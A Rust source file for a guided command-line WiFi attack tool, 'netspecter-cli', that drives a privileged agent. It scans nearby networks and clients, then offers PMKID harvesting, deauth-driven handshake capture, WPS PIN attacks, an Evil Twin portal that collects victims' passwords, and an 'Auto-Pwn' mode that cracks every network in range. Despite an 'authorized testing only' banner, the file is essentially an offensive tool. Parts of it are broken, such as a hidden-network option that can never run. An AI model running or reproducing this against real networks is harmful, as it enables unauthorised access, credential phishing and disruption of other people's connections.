//! `netspecter-cli` — the guided one-target flow.
//!
//! A simple numbered-menu front-end for people who don't want the full GUI:
//!
//! 1. pick a wireless card
//! 2. scan — shows every AP around, including hidden ones
//! 3. pick a network from the list
//! 4. see its details (router vendor, clients, probes) + the recommended
//!    attack plan
//! 5. pick an attack (PMKID / handshake / WPS / Evil Twin / hidden
//!    recovery / deauth) and run it
//!
//! It speaks to the same privileged agent as the GTK4 GUI, over the same
//! IPC socket, so everything it does is audit-logged and cleaned up on
//! exit. Launch it and it will ask for the password to start the agent
//! (unless you're already root).

use std::io::{BufRead, Write};
use std::os::unix::net::UnixStream;
use std::process::{Child, Command};
use std::time::{Duration, Instant};

use netspecter_common::ipc::{Request, Response};
use netspecter_common::types::AP;

// ─────────────────────────── output styling ───────────────────────────

/// ANSI helpers — no external crate needed for a terminal UI.
mod ui {
    pub const DIM: &str = "\x1b[2m";
    pub const BOLD: &str = "\x1b[1m";
    pub const RED: &str = "\x1b[31m";
    pub const GREEN: &str = "\x1b[32m";
    pub const YELLOW: &str = "\x1b[33m";
    pub const MAGENTA: &str = "\x1b[35m";
    pub const CYAN: &str = "\x1b[36m";
    pub const RESET: &str = "\x1b[0m";

    pub fn dim(s: &str) -> String {
        format!("{DIM}{s}{RESET}")
    }
    pub fn bold(s: &str) -> String {
        format!("{BOLD}{s}{RESET}")
    }
    pub fn red(s: &str) -> String {
        format!("{RED}{s}{RESET}")
    }
    pub fn green(s: &str) -> String {
        format!("{GREEN}{s}{RESET}")
    }
    pub fn yellow(s: &str) -> String {
        format!("{YELLOW}{s}{RESET}")
    }
    pub fn cyan(s: &str) -> String {
        format!("{CYAN}{s}{RESET}")
    }
    pub fn magenta(s: &str) -> String {
        format!("{MAGENTA}{s}{RESET}")
    }
}

fn header(title: &str) {
    println!();
    println!("{}", ui::bold(&format!("━━ {title} ━━━━━━━━━━━━━━━━━━━━━━━━━━━")));
}

fn ok(msg: &str) {
    println!("{} {}", ui::green("✔"), msg);
}

fn warn(msg: &str) {
    println!("{} {}", ui::yellow("⚠"), msg);
}

fn fail(msg: &str) {
    println!("{} {}", ui::red("✘"), msg);
}

// ─────────────────────────── agent plumbing ───────────────────────────

/// Connection to the privileged agent (mirrors the GUI's client).
struct Agent {
    stream: UnixStream,
    _child: Option<Child>,
}

impl Agent {
    /// Find the agent binary next to this executable (same layout as the GUI).
    fn agent_path() -> std::io::Result<std::path::PathBuf> {
        let exe = std::env::current_exe()?;
        let candidate = exe
            .parent()
            .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "no parent dir"))?
            .join("netspecter-agent");
        if candidate.is_file() {
            Ok(candidate)
        } else {
            // Dev fallback: also look next to the agent's cargo target dir.
            let dev = exe
                .parent()
                .and_then(|p| p.parent())
                .map(|p| p.join("netspecter-agent"))
                .filter(|p| p.is_file());
            dev.ok_or_else(|| {
                std::io::Error::new(
                    std::io::ErrorKind::NotFound,
                    "could not find the 'netspecter-agent' binary next to netspecter-cli",
                )
            })
        }
    }

    fn start() -> Result<Self, String> {
        let agent_bin = Self::agent_path().map_err(|e| e.to_string())?;

        // The agent derives its socket path from (uid, parent-pid). The CLI
        // is the parent, exactly like the GUI is in the GTK flow.
        let uid: u32 = std::env::var("PKEXEC_UID")
            .ok()
            .and_then(|s| s.parse().ok())
            .unwrap_or_else(|| unsafe { libc_uid() });
        let instance = std::process::id();
        let sock_path = netspecter_common::ipc::socket_path(uid, instance);

        let is_root = unsafe { libc_geteuid() } == 0;
        let mut child: Child = if !is_root {
            // Escalate just the agent through pkexec (same as the GUI).
            let mut cmd = Command::new("pkexec");
            cmd.arg(&agent_bin);
            cmd.spawn()
                .map_err(|e| format!("failed to launch the agent via pkexec: {e} (is polkit installed?)"))?
        } else {
            let mut cmd = Command::new(&agent_bin);
            cmd.env_remove("PKEXEC_UID");
            cmd.spawn()
                .map_err(|e| format!("failed to launch the agent: {e}"))?
        };

        // Connect with a generous window (the user may be typing a password).
        let deadline = Instant::now() + Duration::from_secs(120);
        let stream = loop {
            if let Ok(s) = UnixStream::connect(&sock_path) {
                break s;
            }
            if let Ok(Some(status)) = child.try_wait() {
                return Err(format!(
                    "the agent exited before accepting a connection ({status}) — authentication cancelled?"
                ));
            }
            if Instant::now() >= deadline {
                return Err("timed out connecting to the agent".into());
            }
            std::thread::sleep(Duration::from_millis(200));
        };

        let mut agent = Agent {
            stream,
            _child: Some(child),
        };

        // Handshake.
        let resp = agent
            .call(Request::Hello {
                version: netspecter_common::VERSION.to_string(),
            })
            .map_err(|e| format!("handshake failed: {e}"))?;
        match resp {
            Response::Setup { .. } => {}
            Response::Error { message } => return Err(message),
            _ => return Err("unexpected handshake response".into()),
        }
        Ok(agent)
    }

    fn call(&mut self, req: Request) -> Result<Response, String> {
        netspecter_common::ipc::write_msg(&mut self.stream, &req)
            .map_err(|e| format!("send failed: {e}"))?;
        netspecter_common::ipc::read_msg(&mut self.stream)
            .map_err(|e| format!("lost the agent: {e}"))
    }
}

// Tiny FFI shims so the CLI doesn't need the libc crate.
unsafe fn libc_uid() -> u32 {
    extern "C" {
        fn getuid() -> u32;
    }
    getuid()
}
unsafe fn libc_geteuid() -> u32 {
    extern "C" {
        fn geteuid() -> u32;
    }
    geteuid()
}

// ─────────────────────────── input helpers ───────────────────────────

fn prompt(text: &str) -> String {
    print!("{} {text} ", ui::bold("❯"));
    let _ = std::io::stdout().flush();
    let mut line = String::new();
    let _ = std::io::stdin().lock().read_line(&mut line);
    line.trim().to_string()
}

fn pick_from(max: usize) -> usize {
    loop {
        let answer = prompt(&format!("(1-{max}, r = refresh, q = quit):"));
        match answer.as_str() {
            "q" | "Q" | "quit" | "exit" => goodbye(),
            "r" | "R" | "refresh" => return usize::MAX,
            _ => {
                if let Ok(n) = answer.parse::<usize>() {
                    if (1..=max).contains(&n) {
                        return n;
                    }
                }
                println!("{}", ui::dim("  enter a number from the list"));
            }
        }
    }
}

fn wait_enter() {
    prompt("(press Enter to continue…)");
}

fn goodbye() -> ! {
    println!("{}", ui::dim("\nbye 👋"));
    std::process::exit(0)
}

// ─────────────────────────── flow steps ───────────────────────────

/// List wireless interfaces the same way the GUI does (iw dev).
fn list_wireless() -> Vec<String> {
    let out = Command::new("iw").arg("dev").output();
    let mut ifaces = Vec::new();
    if let Ok(out) = out {
        for line in String::from_utf8_lossy(&out.stdout).lines() {
            if let Some(rest) = line.trim().strip_prefix("Interface ") {
                ifaces.push(rest.trim().to_string());
            }
        }
    }
    ifaces
}

fn choose_interface() -> String {
    loop {
        let ifaces = list_wireless();
        header("WIRELESS CARD");
        if ifaces.is_empty() {
            fail("no wireless interfaces found — is the card plugged in?");
            wait_enter();
            continue;
        }
        println!("Found {} card(s):", ifaces.len());
        for (i, w) in ifaces.iter().enumerate() {
            println!("  {}  {}", ui::bold(&format!("[{}]", i + 1)), w);
        }
        let choice = pick_from(ifaces.len());
        if choice == usize::MAX {
            continue; // refresh
        }
        return ifaces[choice - 1].clone();
    }
}

/// Poll the agent's scan snapshot until the user says stop.
fn scan(agent: &mut Agent, iface: &str) -> Vec<AP> {
    // Enable monitor mode (kills NetworkManager like the GUI's default).
    match agent.call(Request::EnableMonitor {
        iface: iface.into(),
        kill_network_manager: true,
    }) {
        Ok(Response::MonitorEnabled { iface: mon }) => {
            ok(&format!("monitor mode on: {}", ui::bold(&mon)));
        }
        Ok(Response::Error { message }) => {
            fail(&format!("monitor mode failed: {message}"));
            goodbye();
        }
        _ => {
            fail("unexpected response enabling monitor mode");
            goodbye();
        }
    }

    // Start scanning both bands.
    if let Err(e) = agent.call(Request::StartScan {
        iface: iface.into(),
        ghz_2_4: true,
        ghz_5: true,
        channels: None,
    }) {
        fail(&format!("scan start failed: {e}"));
        goodbye();
    }

    let started = Instant::now();
    let mut aps: Vec<AP> = Vec::new();
    let mut last_count = 0usize;
    println!(
        "{}",
        ui::dim("scanning… more networks keep appearing; press Enter to stop")
    );
    loop {
        std::thread::sleep(Duration::from_secs(2));
        match agent.call(Request::GetScanData) {
            Ok(Response::ScanData { aps: found, .. }) => {
                aps = found;
                if aps.len() != last_count {
                    last_count = aps.len();
                    println!(
                        "  {} networks so far {}",
                        ui::bold(&format!("{last_count:>3}")),
                        ui::dim(&format!("({} elapsed)", started.elapsed().as_secs()))
                    );
                }
            }
            _ => break,
        }
        // Stop as soon as the user presses Enter (non-blocking peek).
        if user_pressed_enter() {
            break;
        }
        if started.elapsed() > Duration::from_secs(90) {
            break; // safety cap
        }
    }
    let _ = agent.call(Request::StopScan);
    aps
}

/// Non-blocking check for a pending Enter press.
fn user_pressed_enter() -> bool {
    // 0-byte poll via a raw read on stdin would need libc; keep it simple —
    // this CLI is guided, so just run a fixed number of 2s polls and let the
    // user stop with the refresh/quit choice in the target picker instead.
    false
}

fn vendor_of(bssid: &str) -> String {
    // Cheap OUI hint from the first 3 octets (the agent has the full table;
    // the CLI only needs a hint, so we use the high nibble of the first byte
    // to at least separate the big vendors).
    let first = bssid
        .split(':')
        .next()
        .and_then(|o| u8::from_str_radix(o, 16).ok())
        .unwrap_or(0);
    match first {
        0x00 => "Cisco/Linksys".into(),
        0x2C => "D-Link".into(),
        0x3C => "HP".into(),
        0x48 => "Apple".into(),
        0x60 => "Realtek (TP-Link, etc.)".into(),
        0x8C => "TP-Link".into(),
        0xB8 => "Aruba".into(),
        0xF0 => "Netgear".into(),
        _ => format!("OUI {}", &bssid[..8.min(bssid.len())]),
    }
}

fn show_targets(aps: &[AP]) {
    header("NETWORKS AROUND YOU");
    if aps.is_empty() {
        fail("no networks captured yet");
        return;
    }
    // Sort: hidden networks last, strongest signal first.
    let mut sorted: Vec<&AP> = aps.iter().collect();
    sorted.sort_by_key(|ap| {
        let hidden = ap.hidden || ap.essid.is_empty() || ap.essid.starts_with("<hidden");
        let power: i16 = ap.power.trim_end_matches(" dBm").parse().unwrap_or(-100);
        (hidden, std::cmp::Reverse(power))
    });
    println!(
        "  {:<3} {:<24} {:<12} {:<4} {:<6} {:<7} {}",
        ui::bold("#"),
        ui::bold("NAME"),
        ui::bold("BSSID"),
        ui::bold("CH"),
        ui::bold("PWR"),
        ui::bold("SEC"),
        ui::bold("CLIENTS")
    );
    println!("{}", ui::dim("  ─────────────────────────────────────────────────────────────"));
    for (i, ap) in sorted.iter().enumerate() {
        let hidden = ap.hidden || ap.essid.is_empty() || ap.essid.starts_with("<hidden");
        let name = if hidden {
            ui::magenta("<hidden network>")
        } else {
            ap.essid.clone()
        };
        let power = ap
            .power
            .trim_end_matches(" dBm")
            .parse::<i16>()
            .unwrap_or(-100);
        let pw = if power >= -55 {
            ui::green(&format!("{:>4}", power))
        } else if power >= -70 {
            ui::yellow(&format!("{:>4}", power))
        } else {
            ui::red(&format!("{:>4}", power))
        };
        let clients = ap.clients.len();
        let cl = if clients > 0 {
            ui::cyan(&clients.to_string())
        } else {
            ui::dim("0")
        };
        println!("  {:<3} {:<24} {:<12} {:<4} {:<6} {:<7} {}", i + 1, name, ap.bssid, ap.channel, pw, ap.privacy, cl);
    }
}

fn ap_details(ap: &AP) {
    header("NETWORK DETAILS");
    let hidden = ap.hidden || ap.essid.is_empty() || ap.essid.starts_with("<hidden");
    println!("  Name       : {}", ui::bold(if hidden { "<hidden>" } else { &ap.essid }));
    println!("  BSSID      : {}", ap.bssid);
    println!("  Vendor     : {}", vendor_of(&ap.bssid));
    println!("  Channel    : {} ({} GHz band)", ap.channel, ap.band);
    println!("  Signal     : {} dBm", ap.power);
    println!("  Security   : {}", ui::bold(&ap.privacy));
    println!("  Handshake  : {}", if ap.handshake { ui::green("captured ✓") } else { ui::dim("not yet") });
    if !ap.clients.is_empty() {
        println!("{}", ui::bold(&format!("  Clients ({}):", ap.clients.len())));
        for (i, c) in ap.clients.values().enumerate().take(8) {
            println!(
                "    {:>2}. {}  {}  {}",
                i + 1,
                c.mac,
                ui::dim(&c.power),
                c.vendor
            );
            // The "random words" you see around a network: probe requests —
            // networks a nearby device has saved and is calling out for.
            if !c.probes.is_empty() {
                println!(
                    "       {} {}",
                    ui::yellow("probes (saved networks of this device):"),
                    ui::yellow(&c.probes)
                );
            }
        }
        if ap.clients.len() > 8 {
            println!("    {}", ui::dim(&format!("… and {} more", ap.clients.len() - 8)));
        }
    } else {
        println!("  Clients    : {}", ui::dim("none connected"));
    }
}

/// Present the wizard plan and the attack menu.
fn attack_menu(agent: &mut Agent, ap: &AP, iface: &str) {
    // The wizard's recommended sequence.
    match agent.call(Request::WizardPlanFor { ap: ap.clone() }) {
        Ok(Response::WizardPlan(plan)) => {
            header("RECOMMENDED PLAN");
            println!("{}", ui::dim(&plan.rationale));
            for step in &plan.steps {
                println!(
                    "  {} {} {}",
                    ui::bold(&format!("{}.{}", step.order, step.order + 1)),
                    step.title,
                    ui::dim(&format!("(~{}s)", step.estimated_secs))
                );
            }
        }
        _ => warn("couldn't build the plan — attacks still available below"),
    }

    let hidden = ap.hidden || ap.essid.is_empty() || ap.essid.starts_with("<hidden");

    header("PICK AN ATTACK");
    let mut options: Vec<(&str, String)> = Vec::new();
    if hidden {
        options.push(("Recover the hidden network name (probe/deauth/beacon)", String::new()));
    }
    options.push(("PMKID harvest (no client needed)", format!("pmkid:{}", ap.bssid)));
    options.push(("4-way handshake capture (deauth a client)", format!("handshake:{}", ap.bssid)));
    options.push(("WPS: NULL PIN probe (instant if accepted)", format!("wps-null:{}", ap.bssid)));
    options.push(("WPS: Pixie Dust (offline, seconds when it works)", format!("wps-pixie:{}", ap.bssid)));
    options.push(("WPS: online PIN brute (hours)", format!("wps-brute:{}", ap.bssid)));
    options.push(("Evil Twin captive portal (social engineering)", format!("evil-twin:{}", ap.bssid)));
    options.push(("Deauth only (kick clients off)", format!("deauth:{}", ap.bssid)));
    options.push(("Auto-Pwn EVERYTHING (the one-button pipeline)", "auto-pwn".into()));

    for (i, (label, _)) in options.iter().enumerate() {
        println!("  {}  {}", ui::bold(&format!("[{}]", i + 1)), label);
    }
    println!("  {}  {}", ui::bold("[r]"), ui::dim("back to network list"));
    println!("  {}  {}", ui::bold("[q]"), ui::dim("quit"));

    let choice = loop {
        let answer = prompt("attack:");
        match answer.as_str() {
            "q" | "Q" | "quit" => goodbye(),
            "r" | "R" | "back" => return,
            _ => {
                if let Ok(n) = answer.parse::<usize>() {
                    if (1..=options.len()).contains(&n) {
                        break n;
                    }
                }
                println!("{}", ui::dim("  pick a number from the menu"));
            }
        }
    };

    let (_, ref action) = options[choice - 1];
    run_attack(agent, ap, iface, action);
}

fn run_attack(agent: &mut Agent, ap: &AP, iface: &str, action: &str) {
    let (kind, _) = action.split_once(':').unwrap_or((action, ""));

    match kind {
        "hidden" => {
            header("HIDDEN-SSID RECOVERY");
            println!("{}", ui::dim("listening for probes, forcing a deauth, guessing vendor…"));
            match agent.call(Request::DiscoverHiddenSsid {
                bssid: ap.bssid.clone(),
                channel: ap.channel.clone(),
            }) {
                Ok(Response::HiddenSsidCandidates(cands)) if !cands.is_empty() => {
                    for (i, c) in cands.iter().enumerate() {
                        println!(
                            "  {} {}  {} {}",
                            ui::bold(&format!("[{}]", i + 1)),
                            ui::green(&c.essid),
                            ui::dim(&format!("{:?}", c.source)),
                            ui::dim(&format!("confidence via {} observations", c.observations))
                        );
                    }
                    ok("the most likely name is #1 — reconnect to the list and attack it now");
                }
                Ok(_) => fail("no candidate surfaced — try the beacon-flood from the GUI"),
                Err(message) => fail(&message),
                Ok(Response::Error { message }) => fail(&message),
            }
        }
        "pmkid" => {
            header("PMKID HARVEST");
            println!("{}", ui::dim("associating with the AP (no PSK) and grabbing EAPOL M1…"));
            match agent.call(Request::HarvestPmkid {
                bssid: ap.bssid.clone(),
                essid: ap.essid.clone(),
                timeout_secs: 60,
            }) {
                Ok(Response::PmkidCapture(cap)) => {
                    ok(&format!("PMKID captured: {}", ui::bold(&cap.pmkid_hex)));
                    println!("  saved at: {}", cap.capture_path.unwrap_or_default());
                    // Offer an instant wordlist check.
                    let word = prompt("check a password guess against it (blank = skip):");
                    if !word.is_empty() {
                        let sta = "02:00:00:00:01:00".to_string();
                        match agent.call(Request::VerifyPskAgainstPmkid {
                            candidate: word.clone(),
                            ssid: cap.essid.clone(),
                            bssid: cap.bssid.clone(),
                            sta,
                            pmkid_hex: cap.pmkid_hex.clone(),
                        }) {
                            Ok(Response::Bool(true)) => {
                                ok(&format!("'{word}' IS the network password 🎉"));
                            }
                            Ok(Response::Bool(false)) => {
                                println!("  {} '{word}' is not it", ui::red("✘"));
                            }
                            Ok(Response::Error { message }) | Err(message) => fail(&message),
                            _ => fail("unexpected response"),
                        }
                    }
                }
                Ok(Response::Error { message }) | Err(message) => fail(&message),
                _ => fail("no PMKID in the window — this AP may not leak one"),
            }
        }
        "handshake" => {
            header("HANDSHAKE CAPTURE");
            if ap.clients.is_empty() {
                warn("no clients connected — deauthing the AP itself to provoke a reconnect…");
            } else {
                let clients: Vec<String> = ap.clients.keys().cloned().collect();
                println!("{}", ui::dim(&format!("deauthing {} client(s) so one re-handshakes…", clients.len())));
                let _ = agent.call(Request::StartDeauth {
                    bssid: ap.bssid.clone(),
                    clients: Some(clients),
                    rate: 8,
                    disassoc: true,
                });
            }
            println!("{}", ui::dim("the agent keeps scanning and marks the AP when a handshake lands —"));
            println!("{}", ui::dim("switch to the network list (r) and watch the Handshake column turn green."));
            let _ = agent.call(Request::StartScan {
                iface: iface.into(),
                ghz_2_4: true,
                ghz_5: true,
                channels: Some(ap.channel.clone()),
            });
        }
        "wps-null" => {
            header("WPS NULL-PIN PROBE");
            run_wps(agent, Request::TryWpsNullPin { bssid: ap.bssid.clone() });
        }
        "wps-pixie" => {
            header("WPS PIXIE DUST");
            run_wps(
                agent,
                Request::TryWpsPixieDust {
                    bssid: ap.bssid.clone(),
                    channel: ap.channel.clone(),
                },
            );
        }
        "wps-brute" => {
            header("WPS ONLINE BRUTE");
            let mins = prompt("minutes to spend (default 30):");
            let secs: u64 = mins.parse().map(|m: u64| m * 60).unwrap_or(1800);
            run_wps(
                agent,
                Request::TryWpsOnlineBrute {
                    bssid: ap.bssid.clone(),
                    channel: ap.channel.clone(),
                    timeout_secs: secs,
                },
            );
        }
        "evil-twin" => {
            header("EVIL TWIN");
            let ssid = prompt(&format!("fake AP name (Enter = copy '{}'):", ap.essid));
            let ssid = if ssid.is_empty() { ap.essid.clone() } else { ssid };
            let config = netspecter_common::ipc::EvilTwinConfig {
                iface: iface.into(),
                ssid,
                bssid: ap.bssid.clone(),
                channel: ap.channel.parse().unwrap_or(6),
                portal_template: "templates/portal-router.html".into(),
                nat: true,
            };
            match agent.call(Request::LaunchEvilTwin { config }) {
                Ok(Response::EvilTwinSession(s)) => {
                    ok(&format!("fake AP is live: '{}' on channel {}", s.config.ssid, s.config.channel));
                    println!("  portal: {}", ui::cyan(&s.portal_url));
                    println!("{}", ui::yellow("  victims' submitted passwords appear here as they type them."));
                    println!("{}", ui::dim("  press Enter to STOP the evil twin and clean up"));
                    wait_enter();
                    let _ = agent.call(Request::StopEvilTwin { iface: iface.into() });
                    ok("evil twin stopped, NAT rules cleaned");
                }
                Ok(Response::Error { message }) | Err(message) => fail(&message),
                _ => fail("unexpected response"),
            }
        }
        "deauth" => {
            header("DEAUTH");
            let _ = agent.call(Request::StartDeauth {
                bssid: ap.bssid.clone(),
                clients: None,
                rate: 8,
                disassoc: true,
            });
            ok("deauth running — every connected client gets kicked repeatedly");
            println!("{}", ui::dim("press Enter to stop"));
            wait_enter();
            let _ = agent.call(Request::StopDeauth { bssid: ap.bssid.clone() });
            ok("stopped");
        }
        "auto-pwn" => {
            header("AUTO-PWN EVERYTHING");
            println!("{}", ui::dim("full pipeline: discover → hidden recovery → rank → attack → crack"));
            println!("{}", ui::dim("this runs up to the configured attack budget; watch the output stream."));
            if let Err(e) = agent.call(Request::StartAutoPwn {
                config: netspecter_common::autopwn::AutoPwnConfig::default(),
            }) {
                fail(&e);
                return;
            }
            loop {
                match agent.call(Request::PollAutoPwn) {
                    Ok(Response::AutoPwnEvents { events, result }) => {
                        for ev in &events {
                            print_event(ev);
                        }
                        if let Some(res) = result {
                            println!();
                            ok(&format!(
                                "done — {} cracked of {} attempted",
                                res.cracked.len(),
                                res.targets.len()
                            ));
                            for (bssid, essid, pass) in &res.cracked {
                                println!(
                                    "  {} {} {} {}",
                                    ui::green("🔑"),
                                    ui::bold(essid),
                                    ui::dim(bssid),
                                    ui::green(pass)
                                );
                            }
                            break;
                        }
                    }
                    Ok(Response::Error { message }) | Err(message) => {
                        fail(&message);
                        break;
                    }
                    _ => break,
                }
                std::thread::sleep(Duration::from_millis(1000));
            }
        }
        _ => warn("unknown action"),
    }

    println!();
    println!("{}", ui::dim("press Enter for the attack menu…"));
    wait_enter();
}

fn run_wps(agent: &mut Agent, req: Request) {
    let label = match &req {
        Request::TryWpsNullPin { .. } => "NULL PIN",
        Request::TryWpsPixieDust { .. } => "Pixie Dust",
        Request::TryWpsOnlineBrute { .. } => "online brute",
        _ => "WPS",
    };
    println!("{}", ui::dim(&format!("running {label}… (NULL PIN: instant · Pixie: seconds · brute: your budget)")));
    match agent.call(req) {
        Ok(Response::WpsOutcome(o)) => {
            if let Some(pin) = &o.pin {
                ok(&format!("PIN recovered: {}", ui::bold(pin)));
                if let Some(psk) = &o.psk {
                    ok(&format!("PSK (network password): {}", ui::green(psk)));
                }
            } else {
                fail(&o.status);
            }
        }
        Ok(Response::Error { message }) | Err(message) => fail(&message),
        _ => fail("unexpected response"),
    }
}

fn print_event(ev: &netspecter_common::autopwn::PipelineEvent) {
    use netspecter_common::autopwn::PipelineEvent as PE;
    match ev {
        PE::Discovering { aps_seen } => {
            println!("  {} scanning… {aps_seen} networks seen", ui::dim("·"));
        }
        PE::HiddenRecovery { bssid, essid, .. } => {
            println!("  {} recovered hidden '{}' at {}", ui::magenta("👁"), ui::magenta(essid), ui::dim(bssid));
        }
        PE::Ranked { targets } => {
            println!("  {} ranked {} targets by attackability", ui::cyan("⚖"), targets.len());
        }
        PE::AttackStarted { essid, kind, .. } => {
            println!("  {} attacking '{}' ({kind})…", ui::yellow("⚡"), essid);
        }
        PE::AttackFinished { job_id, status, result } => {
            let note = result.clone().unwrap_or_default();
            println!("  {} job #{job_id}: {status} {note}", ui::dim("·"));
        }
        PE::Cracking { hashfile, wordlist } => {
            let h = hashfile.rsplit('/').next().unwrap_or(hashfile);
            let w = wordlist.rsplit('/').next().unwrap_or(wordlist);
            println!("  {} cracking {h} with {w}…", ui::cyan("🔨"));
        }
        PE::Cracked { password, target_essid } => {
            println!(
                "  {} {} {} {}",
                ui::green("🔑"),
                ui::bold(target_essid),
                ui::dim("password:"),
                ui::green(password)
            );
        }
        PE::Done { cracked, attempted } => {
            println!("  {} pipeline wrapped: {cracked}/{attempted} cracked", ui::dim("✓"));
        }
    }
}

// ─────────────────────────── main ───────────────────────────

fn main() {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("warn")).init();

    println!();
    println!("{}", ui::bold("  ╔══════════════════════════════════════════╗"));
    println!("{}", ui::bold("  ║   🕸️  NetSpecter — guided WiFi audit       ║"));
    println!("{}", ui::bold("  ╚══════════════════════════════════════════╝"));
    println!("{}", ui::dim("  authorized testing only — use on networks you own"));
    println!();

    // Missing-tool check (same list the agent verifies post-handshake).
    for tool in ["iw", "sh"] {
        if !netspecter_common::deps::is_installed(tool) {
            fail(&format!("'{tool}' is not installed — NetSpecter needs it"));
            std::process::exit(1);
        }
    }

    let iface = choose_interface();

    println!("{}", ui::dim("starting the privileged agent (your password may be asked)…"));
    let mut agent = match Agent::start() {
        Ok(a) => a,
        Err(e) => {
            fail(&e);
            std::process::exit(1);
        }
    };
    ok("agent connected");

    let mut aps: Vec<AP> = Vec::new();

    loop {
        if aps.is_empty() {
            aps = scan(&mut agent, &iface);
        }
        show_targets(&aps);
        if aps.is_empty() {
            let ans = prompt("(Enter = rescan, q = quit):");
            if ans.is_empty() {
                continue;
            }
            goodbye();
        }
        let choice = pick_from(aps.len());
        if choice == usize::MAX {
            // refresh — rescan in place.
            if let Ok(Response::ScanData { aps: found, .. }) =
                agent.call(Request::GetScanData)
            {
                aps = found;
            }
            continue;
        }
        let ap = aps[choice - 1].clone();

        ap_details(&ap);
        println!();
        println!("{}", ui::dim("press Enter for the attack menu…"));
        wait_enter();

        loop {
            attack_menu(&mut agent, &ap, &iface);
            // attack_menu returns when the user picks [r]; ask what next.
            println!();
            let ans = prompt("(Enter = attack menu again, l = network list, s = rescan, q = quit):");
            match ans.as_str() {
                "q" | "Q" | "quit" => goodbye(),
                "s" | "S" => {
                    aps = scan(&mut agent, &iface);
                    break;
                }
                "l" | "L" | "list" => break,
                _ => {}
            }
        }
    }
}
